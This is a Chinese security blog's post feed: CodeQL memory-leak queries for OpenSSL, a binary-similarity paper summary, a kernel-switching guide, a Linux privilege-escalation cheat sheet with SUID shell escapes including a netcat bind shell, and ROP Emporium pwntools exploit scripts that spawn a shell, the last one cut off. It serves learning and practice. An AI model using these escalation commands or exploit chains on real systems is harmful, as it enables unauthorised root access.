)}closeCall判断是否调用了Close类函数，或者调用了函数func，传入了参数，并在func里对该参数调用了Close类函数由于我们现在只考虑函数失去配对的情况，所以不考虑样本中realloc的一类情况。STEP3 套套套#对于其他的部分，我们只要修改名称为自己喜欢的就行啦，直接套用即可。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150import cppimport semmle.code.cpp.controlflow.Guardsimport semmle.code.cpp.dataflow.DataFlowimport semmle.code.cpp.controlflow.StackVariableReachabilitypredicate checkNameOpen(Function func) { func.getName().matches(\"RSA_new\") }predicate checkNameClose(Function func) { func.getName().matches(\"RSA_free\") }/** * 'call' is either a direct call to f, or a possible call to f * via a function pointer. */predicate mayCallFunction(Expr call, Function f) { call.(FunctionCall).getTarget() = f or call.(VariableCall).getVariable().getAnAssignedValue().getAChild*().(FunctionAccess).getTarget() = f}predicate assignedToFieldOrGlobal(StackVariable v, Expr e) { // assigned to anything except a StackVariable // (typically a field or global, but for example also *ptr = v) e.(Assignment).getRValue() = v.getAnAccess() and not e.(Assignment).getLValue().(VariableAccess).getTarget() instanceof StackVariable or exists(Expr midExpr, Function mid, int arg | // indirect assignment e.(FunctionCall).getArgument(arg) = v.getAnAccess() and mayCallFunction(e, mid) and midExpr.getEnclosingFunction() = mid and assignedToFieldOrGlobal(mid.getParameter(arg), midExpr) ) or // assigned to a field via constructor field initializer e.(ConstructorFieldInit).getExpr() = v.getAnAccess()}predicate openCall(Expr e) { // direct alloc call checkNameOpen(e.(FunctionCall).getTarget()) or // We are only interested in alloc calls that are // actually freed somehow, as MemoryNeverFreed // will catch those that aren't. exists(ReturnStmt rtn | // indirect alloc call mayCallFunction(e, rtn.getEnclosingFunction()) and ( // return alloc openCall(rtn.getExpr()) or // return variable assigned with alloc exists(Variable v | v = rtn.getExpr().(VariableAccess).getTarget() and openCall(v.getAnAssignedValue()) and not assignedToFieldOrGlobal(v, _) ) ) )}predicate closeCall(ControlFlowNode n, Variable v) { exists(int arg | n.(Call).getArgument(arg) = v.getAnAccess() and checkNameClose(n.(Call).getTarget())) or exists(FunctionCall midcall, Function mid, int arg | // indirect free call n.(Call).getArgument(arg) = v.getAnAccess() and mayCallFunction(n, mid) and midcall.getEnclosingFunction() = mid and closeCall(midcall, mid.getParameter(arg)) )}predicate openDefinition(StackVariable v, ControlFlowNode def) { exists(Expr expr | exprDefinition(v, def, expr) and openCall(expr))}class OpenVariableReachability extends StackVariableReachabilityWithReassignment { OpenVariableReachability() { this = \"OpenVariableReachability\" } override predicate isSourceActual(ControlFlowNode node, StackVariable v) { openDefinition(v, node) } override predicate isSinkActual(ControlFlowNode node, StackVariable v) { // node may be used in allocationReaches exists(node.(AnalysedExpr).getNullSuccessor(v)) or closeCall(node, v) or assignedToFieldOrGlobal(v, node) or // node may be used directly in query v.getFunction() = node.(ReturnStmt).getEnclosingFunction() } override predicate isBarrier(ControlFlowNode node, StackVariable v) { definitionBarrier(v, node) }}/** * The value from allocation `def` is still held in Variable `v` upon entering `node`. */predicate openVariableReaches(StackVariable v, ControlFlowNode def, ControlFlowNode node) { exists(OpenVariableReachability r | // reachability r.reachesTo(def, _, node, v) or // accept def node itself r.isSource(def, v) and node = def )}class OpenReachability extends StackVariableReachabilityExt { OpenReachability() { this = \"OpenReachability\" } override predicate isSource(ControlFlowNode node, StackVariable v) { openDefinition(v, node) } override predicate isSink(ControlFlowNode node, StackVariable v) { v.getFunction() = node.(ReturnStmt).getEnclosingFunction() } override predicate isBarrier( ControlFlowNode source, ControlFlowNode node, ControlFlowNode next, StackVariable v ) { isSource(source, v) and next = node.getASuccessor() and // the memory (stored in any variable `v0`) allocated at `source` is freed or // assigned to a global at node, or NULL checked on the edge node -&gt; next. exists(StackVariable v0 | openVariableReaches(v0, source, node) | node.(AnalysedExpr).getNullSuccessor(v0) = next or closeCall(node, v0) or assignedToFieldOrGlobal(v0, node) ) }}predicate openReaches(ControlFlowNode def, ControlFlowNode node) { exists(OpenReachability r | r.reaches(def, _, node))}from ControlFlowNode def, ReturnStmt retwhere openReaches(def, ret) and not exists(StackVariable v | openVariableReaches(v, def, ret) and ret.getAChild*() = v.getAnAccess() )select def, ret,def.getLocation()STEP4 查询结果#最后的结果如下可以看到找到了两个结果，当然这两个结果是在一个函数内，只是返回路径不同，所以报了两个结果123456789101112131415161718192021222324252627static EVP_PKEY *get_test_pkey(void){ static unsigned char n[] = \"\\x00\\xAA\\x36\\xAB\\xCE\\x88\\xAC\\xFD\\xFF\\x55\\x52\\x3C\\x7F\\xC4\\x52\\x3F\" \"\\x90\\xEF\\xA0\\x0D\\xF3\\x77\\x4A\\x25\\x9F\\x2E\\x62\\xB4\\xC5\\xD9\\x9C\\xB5\" \"\\xAD\\xB3\\x00\\xA0\\x28\\x5E\\x53\\x01\\x93\\x0E\\x0C\\x70\\xFB\\x68\\x76\\x93\" \"\\x9C\\xE6\\x16\\xCE\\x62\\x4A\\x11\\xE0\\x08\\x6D\\x34\\x1E\\xBC\\xAC\\xA0\\xA1\" \"\\xF5\"; static unsigned char e[] = \"\\x11\"; RSA *rsa = RSA_new(); EVP_PKEY *pk = EVP_PKEY_new(); if (rsa == NULL || pk == NULL || !EVP_PKEY_assign_RSA(pk, rsa)) { RSA_free(rsa); EVP_PKEY_free(pk); return NULL; } if (!RSA_set0_key(rsa, BN_bin2bn(n, sizeof(n)-1, NULL), BN_bin2bn(e, sizeof(e)-1, NULL), NULL)) { EVP_PKEY_free(pk); return NULL; } return pk;}可以看到在第23行和第26行的return语句前，都没有对rsa进行释放，不过这同样还是在测试的代码里，没有什么价值(但是不妨碍我们提交issue，手动狗头)https://github.com/openssl/openssl/issues/13420，很开心得到了开发者的回应，但是很明显傻逼的我没有看到函数EVP_PKEY_assign_RSA其实是把rsa赋值给了pk，所以在free掉pk的时候，其实也是释放了rsa的空间(提之前我还用valgrind测了没啥问题，我还以为是valgrind出错了，md)。总结#通过上面的惨痛经历，可以看到虽然确实存在函数失配的问题，但对于上面的误报，脚本目前还不能解决，因此还需要更近一步的改进。","link":"/b3ed7ec5.html"},{"title":"Similarity of Binaries Across Optimization Levels and Obfuscation(ESORICS 2020)","text":"现有的二进制相似度检测工作并没有很好的解决编译优化和混淆带来的影响，所以作者提出了IMOPT来重新优化代码，用于提高代码相似性检测的准确率。该方法在测试集上和原本的Asm2vec相比，将精度提高了22.7%，并且可以缓解ollvm混淆带来的影响Introduction#现有工作的不足：静态方法：只统计静态特征，很难揭示语义特征动态方法：一旦加入混淆，junk code等会严重影响代码相似性检测所以作者提出了IMOPT方法，通过re-optimize lifted binary缓解编译优化和混淆对代码相似性检测的影响，提高准确率。由于作者是在二进制上进行这项工作，因此不得不面对下面两个主要的挑战：挑战1：对二进制代码的优化需要准确的指针分析，然而编译过程删除了很多变量信息。即使是编译器，在做指针分析时，也会出错：例如对于下面的代码，不优化时会输出0，而使用O2优化时，会输出1(这是真的，我帮大家试过了)。123456789101112131415#include&lt;stdio.h&gt;int confound_compiler_opt(){ int a,b,*c; if(&amp;b &gt; &amp;a) c = &amp;b-1; else c = &amp;b+1; *c = 11; a = 10; return *c - a;}int main(){ int i = confound_compiler_opt(); printf(\"%d\\n\",i);}挑战2：在指针分析中需要对成本和精度进行折中考虑。对于上面的两个挑战，作者也在文中提出了相应的解决方案：对于挑战1：集成精确的指针分析框架，并实现了canonicalization和elimination两类优化，这两类对相似性比较的影响最大。canonicalization：将逻辑上等价的表达式转换成统一形式elimination：通过可达性分析删除无用或不可达的代码**对于挑战2：**提出了immediate SSA(static single-assignment) transforming algorithm（立即的SSA转换算法），将变量或指针即时的转换为SSA形式。采用SSA，是速度和精确度权衡的结果主要贡献：immediate SSA，O(1)复杂度的快速准确的指针分析指针分析框架二进制代码重优化方法IMOPT实现基本概念#SSA#静态单赋值：1234x = 1; x1 = 1;y = 2; ==&gt; y1 = 2;x = x - y; x2 = x1 - y1;y = x + y; y2 = x2 + y1;好处是一个use只有一个def，方便做def-use分析。同名变量有相同的值，变量的使用只有唯一的定义Dominator#控制节点：n dominates m (n dom m) ：从entry节点到m的所有路径都需要经过节点n，称n是m的dominatorDominance Frontier#Dominance Frontier表示控制流图中聚合的点对于图节点N，DF(N)是一个集合，该集合包含Z，如果Z满足：N是Z某个前驱节点的控制节点N不是Z的控制节点即$DF(N) = {Z | (\\exists p \\in Pred(Z)) N \\ dom \\ p \\land !N \\ dom\\ Z }$这个东西可以用来实现最小SSA，并引入PHI节点。例如通过下面的控制流图我们可以得到Dominance Frontier如下即块2和块8和块9中的对变量x的定义会在块5处聚合。PHI function#为了引入最小SSA，需要利用Dominance Frontier加入PHI节点，示例如下对于左侧示例，我们可以得到Dominance Frontier并在聚合处加入PHI节点一些术语#前向块(Forward Block)，后向块(Backward Block)，回边(Back edge)：如果有a dom b，那么边a-&gt;b 叫做回边，回边指向的块为后向块，其余都是前向块前向定义(Forward Definition)，后向定义Backward Defination：回边起点如果存在对回边终点的变量定义，则为后向定义，否则为前向定义反向可达图(Backward reachable graph)：感觉就是CFG，然后将边反向即时性#即时性是动态地将代码转换成SSA形式并有效维护信息的关键。如果算法在处理时满足下面两个不变量，那么该算法具有即时性：全局不变性：处理一个基本块前，对于块中每个变量v：1)如果只有一个def可以到达该基本块，且基本块前无PHI节点，应记录v的下标；2)否则，应该插入PHI节点，且PHI节点中下标应与其他def下标不同。局部不变性：处理一个基本块后，这个基本块中使用的变量只能存在一个def点可以到达use点，且下标需要一致 。全局不变性确保每个传入的定义都被记录，且插入必要的PHI节点局部不变性确保每个use都与def关联这两点也保证了SSA的正确性**演绎条件(Condition 1) **：算法在CFG的逆后续(Reverse post-order)遍历中进行，在处理块i前，保证每个已处理的块j都满足即时性(j&lt;i)逆后续遍历：123456789101112def postorder(graph, root): \"\"\"Return a post-order ordering of nodes in the graph.\"\"\" visited = set() order = [] def dfs_walk(node): visited.add(node) for succ in graph.successors(node): if not succ in visited: dfs_walk(succ) order.append(node) dfs_walk(root) return order对于上述示例，有：Pre-order: A, C, B, D, E, TPost-order: D, B, E, C, T, AReverse-post-order(RPO): A, T, C, E, B, D示例结果不太符合我们习惯，比如是逆时针访问还是按字母顺序访问，简单来说逆后续遍历就是后续遍历的反向。在SSA图中，这样保证了在处理时use肯定在def后一些引理#Symbols B, D, S, V are used to represent the set of blocks, definitions, statements and variables.IMSSA 算法#主函数#在实现IMSSA算法时，会维护下列信息Symbols B, D, S, V are used to represent the set of blocks, definitions, statements and variables.即def-use边，可达边，Dominating def，最大SSA下标数。算法按照RPO顺序对函数进行处理，如下主函数十分简洁明了，不需要过多解释找SSA的use和def点#补充：12RHS: 赋值操作的右侧，例如 x = y + z中的 y 和 zLHS: 赋值操作的左侧，例如 x = y + z中的 x是正常的SSA生成的算法，不是新方法IF:s是一个phi函数，且s属于基本块bi，遍历所有可以到达bi的块bj，修改块bjRHS中对变量v使用的下标ELSE:否则，修改bi中RHS对变量v的下标LINE2：LHS中找到变量vLINE3：变量v的下标++LINE4：替换变量名LINE5-6：对RHS中用到的变量，加入def-use对集合DU中LINE7：将对v的定义加入Vdef中对单条语句state的处理#LINE2：找use点，改变量名LINE3：指针分析，后面会将具体的算法LINE4-6：找def点，改变量名def传播和可达性传播#PROPAGATE会在基本块b的dominance frontiers引入PHI节点，并且设置该PHI节点为未访问状态PropagateReachability是为了看当前块是否可以执行到该块的后继(无用分支)，当处理到后继节点时，会设置PHI节点为访问过的状态。我感觉这两个函数可以理解为PHI节点会在dominator 节点引入，并且在dominated节点处理。前向块分析#根据引理2和引理3，实现前向块分析如下反向块分析#根据引理4，实现反向块分析如下LINE2：找包含回边的子图，将反向块变换成前向块LINE3：得到RPO序列LINE4-LINE6：按照前向块处理该子图和IMSSA很像，只是不处理已经处理过的基本块二进制优化框架#框架试图通过正规化和删除无用代码，来缓解编译优化和混淆对相似代码检测的影响,由于框架是由指针分析驱动的，所以它应该对基于数据依赖的代码转换具有鲁棒性。集成指针分析#在实现IMSSA过程中，需要加入指针分析，除了E:V(Dominating def)和C:V(最大SSA下标数)，还需要维护D：V-&gt;E(变量-&gt;def表达式)和A:E-&gt;V（地址表达式-&gt;变量）LINE 3-4：如果是变量，得到该变量的表达式LINE 5：遍历表达式中的变量，进行指针分析LINE 8：对分析后的语句进行归一化(逻辑)LINE 10-11：对指针变量进行处理我们知道在IR中，STORE和LOAD都是对地址进行操作的，因此在实现指针分析时，主要关注这两个指令。正规化和死代码删除#正规化将等价但不同的表达式转换成统一形式，从而保持相似性。同时可以实现多级联合消除，例如公共子表达式消除等，进而去除无用代码正规化：收集了44个基本的消除规则(参考ollvm)，例如$(x \\And c ) \\oplus (x|c) \\iff x \\oplus c，(x \\And c) |(x \\And !c) \\iff x$死代码删除：在根据def-use分析和可达性分析，删除无用代码实现和评估#作者在二进制分析平台BAP上以插件形式实现IMOPT过程：使用BAP将二进制转换到它的IR上BIR，然后用插件实现IMOPT过程为了对比实验，也使用Mcsema将二进制转换到LLVM-IR上进行re-optimize(对比IMOPT优化和LLVM-OPT)的效果对比Asm2Vec#12345 BAP IR -&gt; IMOPT -&gt; new binarys -&gt; Asm2vec / \\binarys compare \\ / ------------------&gt; Asm2vec -----------------通过和Asm2Vec对比，IMOPT将准确率提高了近20%抗混淆性能#ollvm回顾-sub：指令混淆-bcf：引入虚假控制流：在原来的控制流图上，通过加入条件跳转语句跳转到一个原来的基本块或者是一个虚假的基本块，并最终跳转回条件跳转语句，引入循环结构，改变控制流图。示例如下：123456void f(int x){ int i; for(i=0;i&lt;x;i++){ printf(\"%d\",i); }}引入虚假控制流前引入虚假控制流后-flat：控制流平坦化：使用一个主分发块，通过条件控制分别进入不同的基本块，然后再回到主分发块，虽然逻辑和原来的程序相同，但分析起来更加复杂，类似于虚拟机对上面函数的控制流平坦化结果如下：使用ollvm 4.0混淆后进行测试，主要测试了-sub，-bcf，-flat选项，结果如下：12345 BAP IR -&gt; IMOPT -&gt; new binarys -&gt; Asm2vec / \\ollvm binarys compare \\ / LLVM IR -&gt; LLVM-OPT -&gt; new binarys -&gt; Asm2vec指针分析效率对比#和SDA(the most efficient approach that supports both pointer and reachability analysis)进行了比较，速度得到了大大提升(15.7x)。总结#我感觉这个东西虽然看起来艰涩难懂，但其实和传统的SSA算法区别没有很大，且对于最重要的指针分析作者并未提供十分有效的细节另外有两个点值得去思考：第一点：对于ollvm，有很多人做去混淆等相关工作了，看得出来这项工作有专门针对ollvm去做研究(比如复杂逻辑的缩减)，不知道对于其他的混淆方法，效果是否有对ollvm的提升那么明显第二点是我自己也不明白的，文中指出即使是编译器对指针分析后优化也会出错，但从算法上看或者也没有案例说明文中的算法不会出现类似的问题参考资料#https://eli.thegreenplace.net/2015/directed-graph-traversal-orderings-and-applications-to-data-flow-analysis/https://github.com/BinaryAnalysisPlatform/baphttps://github.com/lifting-bits/mcsemahttps://github.com/obfuscator-llvm/obfuscator/tree/llvm-4.0","link":"/930679b9.html"},{"title":"linux切换内核版本","text":"内核文件包含：123linux-image-版本号：内核映像文件linux-headers-版本号：内核头文件linux-image-extra-版本号：内核扩展文件切换到固定内核版本#虚拟机安装 ubuntu 16.04装一些软件12apt updateapt install vim修改/etc/apt/sources.list，加入1deb http://security.ubuntu.com/ubuntu trusty-security main查看版本内核1uname -r查找可以切换的内核1apt-cache search linux安装新内核12apt updateapt-get install linux-image-3.13.0-24-generic linux-headers-3.13.0-24-generic linux-image-extra-3.13.0-24-generic查看是否成功1dpkg -l | grep 3.13.0-24-genericvim修改grub配置文件/etc/default/grub将1GRUB_DEFAULT=0修改为1GRUB_DEFAULT=&quot;Advanced options for Ubuntu&gt;Ubuntu, with Linux 3.13.0-24-generic&quot;或者一句话1sed -ir &quot;s/GRUB_DEFAULT=.*/GRUB_DEFAULT=\\&quot;Advanced options for Ubuntu&gt;Ubuntu, with Linux 3.13.0-24-generic\\&quot;/g&quot; /etc/default/grub更新grub1update-grub重启 reboot查看新内核uname -r切换到自编译版本#下载linux kernel源码并解压12wget -c https://github.com/torvalds/linux/archive/v5.10-rc6.zipunzip v5.10-rc6.zip安装依赖12apt updatesudo apt-get install ncurses-dev bison flex libssl-dev bc libelf-dev在源码根目录下配置文件1menuconf为了防止突然中断导致失败，重新编译还是会重新编译已编译的文件，所有选择使用ccache进行加速1apt install ccache修改.bashrc，加入1234export CCACHE_DIR=&quot;/root/.ccache&quot; export CC=&quot;ccache gcc&quot;export CXX=&quot;ccache g++&quot;export PATH=&quot;/usr/lib/ccache:$PATH&quot;source ~/.bashrc修改缓存大小1ccache -M 10G安装模块和内核和内核文件头123make modules_installmake installmake headers_install修改/etc/default/grub，将GRUB_CMDLINE_LINUX_DEFAULT设为text1234567GRUB_DEFAULT=0# GRUB_DEFAULT=&quot;Advanced options for Ubuntu&gt;Ubuntu, with Linux 3.13.0-24-generic&quot;GRUB_HIDDEN_TIMEOUT=GRUB_HIDDEN_TIMEOUT_QUIET=trueGRUB_TIMEOUT=10GRUB_DISTRIBUTOR=`lsb_release -i -s 2&gt; /dev/null || echo Debian`GRUB_CMDLINE_LINUX_DEFAULT=&quot;text&quot;更新grub1update-grub重启reboot查看新内核uname -r新建用户#123sudo useradd -m meow -s /bin/bashsudo passwd meowsu meow参考资料#https://www.jianshu.com/p/e445bbcfee04https://www.cnblogs.com/carle-09/p/12377128.htmlhttps://blog.csdn.net/weixin_40774605/article/details/107214622https://blog.csdn.net/zhanjia0609/article/details/105999988","link":"/a453e6a.html"},{"title":"Linux 提权","text":"信息搜集#基本信息#123456789uname -a 打印所有可用的系统信息uname -r 内核版本uname -n 系统主机名。uname -m 查看系统内核架构（64位/32位）hostname 系统主机名cat /proc/version 内核信息cat /etc/*-release 分发信息cat /etc/issue 分发信息cat /proc/cpuinfo CPU信息用户和群组权限#123456789101112cat /etc/passwd 列出系统上的所有用户cat /etc/group 列出系统上的所有组grep -v -E &quot;^# &quot; /etc/passwd | awk -F: '$3 == 0 { print $1}' 列出所有的超级用户账户whoami 查看当前用户w 谁目前已登录，他们正在做什么last 最后登录用户的列表lastlog 所有用户上次登录的信息lastlog –u %username% 有关指定用户上次登录的信息lastlog |grep -v &quot;Never&quot; 以前登录用户的完id 当前用户信息cat /etc/sudoers 谁被允许以root身份执行sudo -l 当前用户可以以root身份执行操作环境信息#1234567env 显示环境变量set 现实环境变量echo %PATH 路径信息history 显示当前用户的历史命令记录pwd 输出工作目录cat /etc/profile 显示默认系统变量cat /etc/shells 显示可用的shellSUID提权#以下可执行文件可以进行SUID提权12345678nmapvimfindbashmorelessnanocp搜索SUID可执行文件1find / -perm -u=s -type f 2&gt;/dev/nullnmap#查看版本，需要版本范围在(2.02-5.21)之间12nmap -V 启动交互模式nmap&gt; !shVim#1234vim # Press ESC key:set shell=/bin/sh:shellfind#12345touch pentestlabfind pentestlab -exec whoami \\;find pentestlab -exec netcat -lvp 5555 -e /bin/sh \\;外界连接服务器5555端口即可，反斜杠为转义用Bash#123bash -pbash-3.2# iduid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)Less#12less /etc/passwd!/bin/shcp#使用cp覆盖 /etc/shadowmv#使用mv 覆盖 /etc/shadow 或者/etc/sudoersawk#1awk 'BEGIN {system(&quot;/bin/bash&quot;)}'man#12man passwd!/bin/bash辅助提权工具#linux-smart-enumerationhttps://github.com/diego-treitos/linux-smart-enumeration1wget &quot;https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh&quot; -O lse.sh;chmod 700 lse.shLinEnumhttps://github.com/rebootuser/LinEnum1./LinEnum.sh -s -k keyword -r report -e /tmp/ -tlinuxprivcheckerhttps://github.com/sleventyeleven/linuxprivcheckerlinux-exploit-suggesterhttps://github.com/mzet-/linux-exploit-suggesterhttps://github.com/jondonas/linux-exploit-suggester-2linux-soft-exploit-suggester:https://github.com/belane/linux-soft-exploit-suggesterberoothttps://github.com/AlessandroZ/BeRootSUDO_KILLERhttps://github.com/TH3xACE/SUDO_KILLER参考#https://mp.weixin.qq.com/s/23bQ9nhavXGOvOknEc-BAAhttps://mp.weixin.qq.com/s/9iZiOq1rT0E3QiB4VAQtzg","link":"/f3ed21e4.html"},{"title":"CodeQL之CWE-401(4)","text":"之前我们简要的将CWE-401分为了两类：第一类为(过程内)不存在一条路径，将已分配的内存进行了释放，而在写脚本时，我们并没有解决参数传递导致的误报过程内参数传递问题#只在单个函数内找漏洞，需要解决以下两类参数传递问题分配的内存通过函数参数传递回caller分配的内存通过函数返回值返回给caller因此，在之前的查询脚本上，我们可以加入上面两类1234567891011121314151617181920212223242526272829303132import cppimport semmle.code.cpp.controlflow.Guardsimport semmle.code.cpp.dataflow.DataFlowpredicate check_name_pre(Function func) { func.getName().matches(\"RSA_new\") }predicate check_name_post(Function func) { func.getName().matches(\"RSA_free\") }from DataFlow::Node source, DataFlow::Node sink, FunctionCall fcwhere exists( | DataFlow::localFlow(source, sink) and source.asExpr() instanceof FunctionCall and check_name_pre(source.asExpr().(FunctionCall).getTarget()) and check_name_post(fc.getTarget()) and fc.getAnArgument() = sink.asExpr() ) or exists(ReturnStmt ret | // 第一类 DataFlow::localFlow(source, sink) and source.asExpr() instanceof FunctionCall and check_name_pre(source.asExpr().(FunctionCall).getTarget()) and ret.getExpr() = sink.asExpr() ) or exists( Parameter p | // 第二类 DataFlow::localFlow(source, sink) and source.asExpr() instanceof FunctionCall and check_name_pre(source.asExpr().(FunctionCall).getTarget()) and sink.asExpr().getAChild*() = p.getAnAccess() )select source.asExpr(), source.asExpr().getLocation()由于codeql对or连接符查询的优化并不好，所以我们可以分为三个脚本，最后取合集exp1.ql12345678910111213141516171819import cppimport semmle.code.cpp.controlflow.Guardsimport semmle.code.cpp.dataflow.DataFlowpredicate check_name_pre(Function func) { func.getName().matches(\"RSA_new\") }predicate check_name_post(Function func) {func.getName().matches(\"RSA_free\")}// situation 1from DataFlow::Node source,DataFlow::Node sink,FunctionCall fcwhere exists( | DataFlow::localFlow(source, sink) and source.asExpr() instanceof FunctionCall and check_name_pre(source.asExpr().(FunctionCall).getTarget()) and check_name_post(fc.getTarget()) and fc.getAnArgument()=sink.asExpr() )select source.asExpr(),source.asExpr().getLocation()exp2.ql12345678910111213141516import cppimport semmle.code.cpp.controlflow.Guardsimport semmle.code.cpp.dataflow.DataFlowpredicate check_name_pre(Function func) { func.getName().matches(\"RSA_new\") }predicate check_name_post(Function func) {func.getName().matches(\"RSA_free\")}// situation 2from DataFlow::Node source,DataFlow::Node sink,FunctionCall fcwhere exists(ReturnStmt ret | DataFlow::localFlow(source, sink) and source.asExpr() instanceof FunctionCall and check_name_pre(source.asExpr().(FunctionCall).getTarget()) and ret.getExpr() = sink.asExpr())select source.asExpr(),source.asExpr().getLocation()exp3.ql123456789101112131415161718import cppimport semmle.code.cpp.controlflow.Guardsimport semmle.code.cpp.dataflow.DataFlowpredicate check_name_pre(Function func) { func.getName().matches(\"RSA_new\") }predicate check_name_post(Function func) {func.getName().matches(\"RSA_free\")}// situation 3from DataFlow::Node source,DataFlow::Node sink,Parameter pwhere exists( | DataFlow::localFlow(source, sink) and source.asExpr() instanceof FunctionCall and check_name_pre(source.asExpr().(FunctionCall).getTarget()) and sink.asExpr().getAChild*() = p.getAnAccess() )select source.asExpr(),source.asExpr().getLocation()三类取合集后，我们最终只剩下由于CodeQL sink点分析有误的一个误报过程间分析#使用过程间分析，我们需要考虑全局的数据流关系(跨过程)123456789101112131415161718192021222324252627import cppimport semmle.code.cpp.controlflow.Guardsimport semmle.code.cpp.dataflow.DataFlowpredicate check_name_pre(Function func) { func.getName().matches(\"RSA_new\") }predicate check_name_post(Function func) { func.getName().matches(\"RSA_free\") }class MissingCloseConfig extends DataFlow::Configuration { MissingCloseConfig() { this = \"MissingCloseConfig\" } override predicate isSource(DataFlow::Node source) { source.asExpr() instanceof FunctionCall and check_name_pre(source.asExpr().(FunctionCall).getTarget()) } override predicate isSink(DataFlow::Node sink) { exists(FunctionCall fc | check_name_post(fc.getTarget()) and fc.getAnArgument*() = sink.asExpr() ) }}from DataFlow::Node source, DataFlow::Node sink, MissingCloseConfig confwhere conf.hasFlow(source, sink)select source.asExpr(), source.asExpr().getLocation()结果如下：抛开CodeQL sink点识别失败的情况，我们仍然存在一个误报如下：123456789101112131415161718192021static int rsa_cb(int operation, ASN1_VALUE **pval, const ASN1_ITEM *it, void *exarg){ if (operation == ASN1_OP_NEW_PRE) { *pval = (ASN1_VALUE *)RSA_new(); if (*pval != NULL) return 2; return 0; } else if (operation == ASN1_OP_FREE_PRE) { RSA_free((RSA *)*pval); *pval = NULL; return 2; } else if (operation == ASN1_OP_D2I_POST) { if (((RSA *)*pval)-&gt;version != RSA_ASN1_VERSION_MULTI) { /* not a multi-prime key, skip */ return 1; } return (rsa_multip_calc_product((RSA *)*pval) == 1) ? 2 : 0; } return 1;}通过查看源代码，我们可以发现误报的原因是：openssl中，没有任何函数，对rsa_cb函数进行了调用，因此确实不存在全局的从RSA_new到RSA_free的数据流。","link":"/fcace802.html"},{"title":"ROP Emporium (中)","text":"ROP Emporium 第二部分badchars#不可以输入一些可见字符，但是存在异或相关的gadget因此我们可以先和将/bin/sh\\x00与某个数异或后写入缓冲区，然后再通过gadget将其异或回来，最后达成利用x86#12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *''' 8048890: 30 0b xor %cl,(%ebx) 8048892: c3 ret 8048893: 89 37 mov %esi,(%edi) 8048895: c3 ret 8048896: 5b pop %ebx 8048897: 59 pop %ecx 8048898: c3 ret 8048899: 5e pop %esi 804889a: 5f pop %edi 804889b: c3 ret 804889c: 66 90 xchg %ax,%ax 804889e: 66 90 xchg %ax,%ax'''context.log_level = 'debug's = '/bin/sh\\x00'xor_byte = 0x31xor_binsh = ''for i in range(8): xor_binsh += chr(ord(s[i])^xor_byte)xor_binsh = xor_binsh.encode()data_addr = 0x804a038xor_ptr_ebx_cl_ret = 0x8048890mov_ptr_edi_esi_ret = 0x8048893pop_ebx_ecx_ret = 0x8048896pop_esi_edi_ret = 0x8048899p = process('./badchars32')elf = ELF('./badchars32')system_addr = elf.symbols['system']payload = b'a'*44# mov xor_binsh into datapayload += p32(pop_esi_edi_ret)+xor_binsh[0:4]+p32(data_addr)+p32(mov_ptr_edi_esi_ret)payload += p32(pop_esi_edi_ret)+xor_binsh[4:]+p32(data_addr+4)+p32(mov_ptr_edi_esi_ret)# xor xor_binsh with 0x30for i in range(8): payload += p32(pop_ebx_ecx_ret)+p32(data_addr+i)+p32(xor_byte)+p32(xor_ptr_ebx_cl_ret)payload += p32(system_addr)+p32(0xdeafbeaf)+p32(data_addr)p.recvuntil('\\n&gt;')p.sendline(payload)p.interactive()x64#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354'''0000000000400b30 &lt;usefulGadgets&gt;: 400b30: 45 30 37 xor %r14b,(%r15) 400b33: c3 retq 400b34: 4d 89 65 00 mov %r12,0x0(%r13) 400b38: c3 retq 400b39: 5f pop %rdi 400b3a: c3 retq 400b3b: 41 5c pop %r12 400b3d: 41 5d pop %r13 400b3f: c3 retq 400b40: 41 5e pop %r14 400b42: 41 5f pop %r15 400b44: c3 retq 400b45: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 400b4c: 00 00 00 400b4f: 90 nop'''from pwn import *p = process('./badchars')elf = ELF('./badchars')system_addr = elf.symbols['system']data_addr = 0x601070xor_ptr_r15_r14_ret = 0x400b30mov_ptr_r13_r12_ret = 0x400b34pop_rdi_ret = 0x400b39pop_r12_r13_ret = 0x400b3bpop_r14_r15_ret = 0x400b40binsh = '/bin/sh\\x00'xor_byte = 0x44xor_binsh = ''for i in range(8): xor_binsh+=chr(ord(binsh[i])^xor_byte)xor_binsh = xor_binsh.encode()payload = b'a'*40# mov xor_binsh into datapayload += p64(pop_r12_r13_ret)+xor_binsh+p64(data_addr)+p64(mov_ptr_r13_r12_ret)# xorfor i in range(0,8): payload += p64(pop_r14_r15_ret)+p64(xor_byte)+p64(data_addr+i)+p64(xor_ptr_r15_r14_ret)# call systempayload += p64(pop_rdi_ret)+p64(data_addr)+p64(system_addr)p.recvuntil('&gt;')p.sendline(payload)p.interactive()fluff#无法一次性写入/bin/sh\\x00，所以我们利用gadget可以分次写入x86#1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768'''08048670 &lt;questionableGadgets&gt;: 8048670: 5f pop %edi 8048671: 31 d2 xor %edx,%edx 8048673: 5e pop %esi 8048674: bd be ba fe ca mov $0xcafebabe,%ebp 8048679: c3 ret 804867a: 5e pop %esi 804867b: 31 da xor %ebx,%edx 804867d: 5d pop %ebp 804867e: bf be ba ad de mov $0xdeadbabe,%edi 8048683: c3 ret 8048684: bf ef be ad de mov $0xdeadbeef,%edi 8048689: 87 ca xchg %ecx,%edx 804868b: 5d pop %ebp 804868c: ba d0 ce fa de mov $0xdefaced0,%edx 8048691: c3 ret 8048692: 5f pop %edi 8048693: 89 11 mov %edx,(%ecx) 8048695: 5d pop %ebp 8048696: 5b pop %ebx 8048697: 30 19 xor %bl,(%ecx) 8048699: c3 ret 804869a: 66 90 xchg %ax,%ax 804869c: 66 90 xchg %ax,%ax 804869e: 66 90 xchg %ax,%ax'''from pwn import *context.log_level = 'debug'p = process('./fluff32')elf = ELF('./fluff32')system_addr = elf.symbols['system']data_addr = 0x804a028mov_ptr_ecx_edx= 0x8048693pop_ebx = 0x80483e1#pop_ebx = 0x8048696xor_edx_edx = 0x8048671xor_edx_ebx = 0x804867bxchg_edx_ecx = 0x8048689binsh = b'/bin/sh\\x00'def payload_write(data,addr): payload = b'' # ecx = addr 